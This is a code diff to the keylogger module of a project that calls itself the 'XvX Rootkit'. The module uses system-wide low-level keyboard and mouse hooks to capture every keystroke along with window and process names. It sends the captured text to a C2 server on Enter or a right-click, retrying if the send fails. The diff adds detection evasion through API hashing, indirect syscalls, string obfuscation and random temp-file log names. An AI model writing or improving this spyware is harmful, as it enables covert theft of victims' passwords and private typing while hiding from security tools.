@@ -1,12 +1,3 @@
-/*
- * XvX Rootkit - Keylogger Module
- *
- * Copyright (c) 2025 - 28zaakypro@proton.me
- *
- * Low-level keyboard hook to capture keystrokes.
- * Logs all keyboard input and sends to C2 server.
- */
-
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
@@ -18,6 +9,8 @@
 #include <map>
 #include <chrono>
 #include <iomanip>
+#include "APIHashing.h"
+#include "StringObfuscation.h"
 
 using namespace std;
 
@@ -25,6 +18,7 @@ class Keylogger
 {
 private:
     static HHOOK g_hKeyHook;
+    static HHOOK g_hMouseHook;
     static wstring g_keyBuffer;
     static bool g_isActive;
     static HANDLE g_hMutex;
@@ -33,18 +27,16 @@ private:
     static wstring g_currentWindow;
     static bool g_logToFile;
 
-    // Map virtual keys to readable strings
     static wstring getKeyName(DWORD vkCode, bool shift)
     {
         static map<DWORD, wstring> specialKeys = {
-            {VK_BACK, L"[BACKSPACE]"},
             {VK_RETURN, L"[ENTER]\n"},
             {VK_SPACE, L" "},
             {VK_TAB, L"[TAB]"},
             {VK_SHIFT, L""},
             {VK_CONTROL, L""},
             {VK_MENU, L""}, // ALT
-            {VK_CAPITAL, L"[CAPSLOCK]"},
+            {VK_CAPITAL, L""}, // CAPSLOCK ignored
             {VK_ESCAPE, L"[ESC]"},
             {VK_PRIOR, L"[PGUP]"},
             {VK_NEXT, L"[PGDN]"},
@@ -72,26 +64,25 @@ private:
             {VK_F11, L"[F11]"},
             {VK_F12, L"[F12]"}};
 
-        // Check if it's a special key
         auto it = specialKeys.find(vkCode);
         if (it != specialKeys.end())
         {
             return it->second;
         }
 
-        // Check if it's a printable character
+        // Handle printable characters (0-9, A-Z)
         if (vkCode >= 0x30 && vkCode <= 0x5A)
         { // 0-9, A-Z
             wchar_t ch = (wchar_t)vkCode;
 
-            // Handle shift for numbers (symbols)
+            // Convert numbers to symbols when shift is pressed
             if (shift && vkCode >= 0x30 && vkCode <= 0x39)
             {
                 static wstring shiftNumbers = L")!@#$%^&*(";
                 return wstring(1, shiftNumbers[vkCode - 0x30]);
             }
 
-            // Lowercase letters if shift not pressed
+            // Apply lowercase for letters when shift not pressed
             if (!shift && vkCode >= 0x41 && vkCode <= 0x5A)
             {
                 ch = towlower(ch);
@@ -100,13 +91,13 @@ private:
             return wstring(1, ch);
         }
 
-        // Numpad
+        // Handle numpad keys (0-9)
         if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
         {
             return wstring(1, L'0' + (vkCode - VK_NUMPAD0));
         }
 
-        // Special characters
+        // Map for punctuation and symbols with shift variants
         static map<DWORD, pair<wstring, wstring>> charKeys = {
             {VK_OEM_1, {L";", L":"}},      // ;:
             {VK_OEM_PLUS, {L"=", L"+"}},   // =+
@@ -130,20 +121,46 @@ private:
         return L"";
     }
 
-    // Get active window title
+    // Retrieve foreground window title and process name
     static wstring GetActiveWindowTitle()
     {
-        HWND hwnd = GetForegroundWindow();
+        // Resolve GetForegroundWindow via API hashing
+        typedef HWND(WINAPI * pGetForegroundWindow)(VOID);
+        auto fnGetWindow = (pGetForegroundWindow)APIResolver::ResolveAPI(APIHash::GetForegroundWindow);
+        HWND hwnd = fnGetWindow ? fnGetWindow() : NULL;
         if (hwnd == NULL)
             return L"[Unknown Window]";
 
         wchar_t windowTitle[256];
         GetWindowTextW(hwnd, windowTitle, 256);
 
-        // Get process name
+        // Get process name via indirect syscall
         DWORD processId;
         GetWindowThreadProcessId(hwnd, &processId);
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
+
+        // Prepare client ID and object attributes for NtOpenProcess
+        struct
+        {
+            PVOID UniqueProcess;
+            PVOID UniqueThread;
+        } clientId;
+        clientId.UniqueProcess = (PVOID)(ULONG_PTR)processId;
+        clientId.UniqueThread = NULL;
+
+        struct
+        {
+            ULONG Length;
+            HANDLE RootDirectory;
+            PVOID ObjectName;
+            ULONG Attributes;
+            PVOID SecurityDescriptor;
+            PVOID SecurityQualityOfService;
+        } objAttr = {0};
+        objAttr.Length = sizeof(objAttr);
+
+        HANDLE hProcess = NULL;
+        IndirectSyscalls::SysNtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
+
         wchar_t processName[MAX_PATH];
 
         if (hProcess != NULL)
@@ -166,13 +183,13 @@ private:
         return wstring(windowTitle);
     }
 
-    // Write log to file
+    // Append keystroke data to log file
     static void WriteToFile(const wstring &data)
     {
         if (!g_logToFile || g_logFilePath.empty())
             return;
 
-        // Convert wstring path to narrow string for ofstream
+        // Convert wide path to UTF-8 for ofstream
         int pathSize = WideCharToMultiByte(CP_UTF8, 0, g_logFilePath.c_str(), -1, NULL, 0, NULL, NULL);
         if (pathSize <= 0)
             return;
@@ -199,6 +216,7 @@ private:
         }
     }
 
+    // Low-level keyboard hook callback (WH_KEYBOARD_LL)
     static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     {
         if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
@@ -206,14 +224,82 @@ private:
             KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
             DWORD vkCode = pKb->vkCode;
 
-            // Check if Shift is pressed
-            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-            bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+            // Capture current keyboard state for accurate key interpretation
+            BYTE keyboardState[256];
+            if (!GetKeyboardState(keyboardState)) {
+                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+            }
 
-            // For letters, combine shift and capslock
-            bool shouldUppercase = shiftPressed ^ capsLock;
+            wchar_t unicodeBuffer[5] = {0};
+            
+            // Convert virtual key to Unicode using current keyboard layout
+            HWND hwnd = GetForegroundWindow();
+            DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
+            HKL keyboardLayout = GetKeyboardLayout(threadId);            // Flag 0 handles dead keys and AltGr combinations
+            int result = ToUnicodeEx(vkCode, pKb->scanCode, keyboardState, unicodeBuffer, 4, 0, keyboardLayout);
+            
+            wcout << L"[ToUnicodeEx] result=" << result << L" buffer=[" << unicodeBuffer << L"]" << endl;
 
-            wstring keyName = getKeyName(vkCode, shiftPressed);
+            wstring keyName;
+            if (result > 0)
+            {
+                // Successfully captured Unicode character (accents, symbols)
+                keyName = wstring(unicodeBuffer, result);
+            }
+            else
+            {
+                // Fallback for non-printable keys (arrows, function keys)
+                bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                keyName = getKeyName(vkCode, shiftPressed);
+            }
+
+            // Ignore standalone modifier keys (Shift, Ctrl, Alt)
+            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
+                vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
+                vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
+                vkCode == VK_CAPITAL)
+            {
+                // Laisser passer à CallNextHookEx mais ne pas ajouter au buffer
+                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+            }
+
+            // Handle backspace to remove last character from buffer
+            if (vkCode == VK_BACK)
+            {
+                WaitForSingleObject(g_hMutex, INFINITE);
+                if (!g_keyBuffer.empty())
+                {
+                    // Remove last char or entire sequence like [TAB]
+                    size_t lastNewline = g_keyBuffer.find_last_of(L'\n');
+                    size_t lastBracket = g_keyBuffer.find_last_of(L']');
+                    
+                    // If last char is ] (e.g., [TAB]), remove the entire sequence
+                    if (lastBracket != wstring::npos && 
+                        (lastNewline == wstring::npos || lastBracket > lastNewline))
+                    {
+                        size_t openBracket = g_keyBuffer.find_last_of(L'[');
+                        if (openBracket != wstring::npos)
+                        {
+                            g_keyBuffer.erase(openBracket);
+                        }
+                    }
+                    else
+                    {
+                        // Supprimer 1 caractère
+                        g_keyBuffer.pop_back();
+                    }
+                }
+                ReleaseMutex(g_hMutex);
+                
+                // Do not continue - backspace is not added to the buffer
+                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+            }
 
             if (!keyName.empty())
             {
@@ -239,38 +325,97 @@ private:
                     g_keyBuffer += timestamp.str();
                 }
 
-                g_keyBuffer += keyName;
-
-                // Send to callback every 10 seconds OR when buffer reaches 50 characters OR on newline
-                static auto lastSend = chrono::steady_clock::now();
-                auto now = chrono::steady_clock::now();
-                auto elapsed = chrono::duration_cast<chrono::seconds>(now - lastSend).count();
-
-                if (g_keyBuffer.size() >= 50 || keyName.find(L"\n") != wstring::npos || elapsed >= 10)
+                // Morphological keylogger: send buffer on Enter key press
+                if (vkCode == VK_RETURN)
                 {
+                    // Add [ENTER] to the buffer
+                    g_keyBuffer += L"[ENTER]\n";
+                    
                     wstring bufferCopy = g_keyBuffer;
-                    lastSend = now;
+                    g_keyBuffer.clear();
+                    
+                    ReleaseMutex(g_hMutex);
+
+                    // Transmit to C2 server with exponential backoff retry
+                    if (g_callback != nullptr)
+                    {
+                        bool sent = false;
+                        for (int retry = 0; retry < 3 && !sent; retry++)
+                        {
+                            try
+                            {
+                                g_callback(bufferCopy);
+                                sent = true;
+                            }
+                            catch (...)
+                            {
+                                Sleep(100 * (1 << retry)); // Exponential backoff: 100ms, 200ms, 400ms
+                            }
+                        }
+                    }
 
                     // Write to local file as backup
                     WriteToFile(bufferCopy);
-
-                    // Send to C2 if callback available
-                    if (g_callback != nullptr)
-                    {
-                        g_callback(bufferCopy);
-                    }
-
-                    g_keyBuffer.clear();
                 }
-
-                ReleaseMutex(g_hMutex);
+                else
+                {
+                    // Not ENTER, add the character to the buffer
+                    g_keyBuffer += keyName;
+                    ReleaseMutex(g_hMutex);
+                }
             }
         }
 
-        return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+        return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+    }
+
+    // Low-level mouse hook callback (right-click triggers buffer send)
+    static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+    {
+        if (nCode == HC_ACTION && wParam == WM_RBUTTONDOWN)
+        {
+            // Right-click detected - send current buffer (simulates form submission)
+            WaitForSingleObject(g_hMutex, INFINITE);
+
+            if (!g_keyBuffer.empty())
+            {
+                wstring bufferCopy = g_keyBuffer;
+                g_keyBuffer.clear();
+
+                // Send to C2 with retry logic (3 attempts)
+                if (g_callback != nullptr)
+                {
+                    bool sent = false;
+                    for (int retry = 0; retry < 3 && !sent; retry++)
+                    {
+                        try
+                        {
+                            g_callback(bufferCopy);
+                            sent = true;
+                        }
+                        catch (...)
+                        {
+                            Sleep(100 * (1 << retry));
+                        }
+                    }
+                }
+
+                // Write to local file as backup
+                WriteToFile(bufferCopy);
+            }
+
+            ReleaseMutex(g_hMutex);
+        }
+
+        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
+        return fnCallNext ? fnCallNext(g_hMouseHook, nCode, wParam, lParam) : CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
     }
 
 public:
+    // Initialize and start keylogger hooks
     static bool Start(void (*callback)(const wstring &) = nullptr, bool logToFile = true, const wstring &logPath = L"")
     {
         if (g_isActive)
@@ -282,13 +427,18 @@ public:
         g_keyBuffer.clear();
         g_logToFile = logToFile;
 
-        // Setup log file path
+        // Generate random filename in temp directory for stealth
         if (logPath.empty())
         {
-            // Default: %TEMP%\svchost.log (hidden file)
+            // Generate random filename for stealth (avoid IoC detection)
             wchar_t tempPath[MAX_PATH];
             GetTempPathW(MAX_PATH, tempPath);
-            g_logFilePath = wstring(tempPath) + L"svchost.log";
+
+            // Random 8-char hex filename (e.g., 3f8a9b2c.tmp)
+            DWORD seed = GetTickCount() ^ (DWORD)(ULONG_PTR)&g_keyBuffer;
+            wchar_t randomName[16];
+            swprintf_s(randomName, L"%08x.tmp", seed);
+            g_logFilePath = wstring(tempPath) + randomName;
         }
         else
         {
@@ -305,7 +455,7 @@ public:
 
             wstringstream header;
             header << L"========================================\n"
-                   << L"XvX Keylogger Session Started\n"
+                   << OBFUSCATE_W(L"Session Started") << L"\n"
                    << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                    << L"========================================\n";
             WriteToFile(header.str());
@@ -313,7 +463,9 @@ public:
 
         g_hMutex = CreateMutexW(NULL, FALSE, NULL);
 
-        // Install low-level keyboard hook
+        wcout << L"[KEYLOGGER] Installing keyboard hook..." << endl;
+
+        // Install system-wide keyboard hook (no API hashing)
         g_hKeyHook = SetWindowsHookExW(
             WH_KEYBOARD_LL,
             KeyboardProc,
@@ -322,8 +474,43 @@ public:
 
         if (g_hKeyHook == NULL)
         {
+            DWORD err = GetLastError();
+            wcout << L"[ERROR] SetWindowsHookExW (keyboard) failed, error: " << err << endl;
             CloseHandle(g_hMutex);
             return false;
+        }
+        else
+        {
+            wcout << L"[OK] Keyboard hook installed successfully!" << endl;
+        }
+
+        if (g_hKeyHook == NULL)
+        {
+            CloseHandle(g_hMutex);
+            return false;
+        }
+
+        // Install low-level mouse hook for right-click detection
+        wcout << L"[KEYLOGGER] Installing mouse hook..." << endl;
+
+        // Install system-wide mouse hook for right-click detection
+        g_hMouseHook = SetWindowsHookExW(
+            WH_MOUSE_LL,
+            MouseProc,
+            GetModuleHandleW(NULL),
+            0);
+
+        if (g_hMouseHook == NULL)
+        {
+            DWORD err = GetLastError();
+            wcout << L"[ERROR] SetWindowsHookExW (mouse) failed, error: " << err << endl;
+            UnhookWindowsHookEx(g_hKeyHook);
+            CloseHandle(g_hMutex);
+            return false;
+        }
+        else
+        {
+            wcout << L"[OK] Mouse hook installed successfully!" << endl;
         }
 
         g_isActive = true;
@@ -331,6 +518,7 @@ public:
         return true;
     }
 
+    // Stop keylogger and flush remaining buffer
     static void Stop()
     {
         if (!g_isActive)
@@ -338,7 +526,7 @@ public:
             return;
         }
 
-        // Flush remaining buffer
+        // Flush any remaining keystroke data before stopping
         if (!g_keyBuffer.empty())
         {
             WaitForSingleObject(g_hMutex, INFINITE);
@@ -363,7 +551,7 @@ public:
 
             wstringstream footer;
             footer << L"\n========================================\n"
-                   << L"XvX Keylogger Session Ended\n"
+                   << OBFUSCATE_W(L"Session Ended") << L"\n"
                    << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                    << L"========================================\n\n";
             WriteToFile(footer.str());
@@ -373,6 +561,12 @@ public:
         {
             UnhookWindowsHookEx(g_hKeyHook);
             g_hKeyHook = NULL;
+        }
+
+        if (g_hMouseHook != NULL)
+        {
+            UnhookWindowsHookEx(g_hMouseHook);
+            g_hMouseHook = NULL;
         }
 
         if (g_hMutex != NULL)
@@ -418,6 +612,7 @@ public:
 
 // Static member initialization
 HHOOK Keylogger::g_hKeyHook = NULL;
+HHOOK Keylogger::g_hMouseHook = NULL;
 wstring Keylogger::g_keyBuffer;
 bool Keylogger::g_isActive = false;
 HANDLE Keylogger::g_hMutex = NULL;
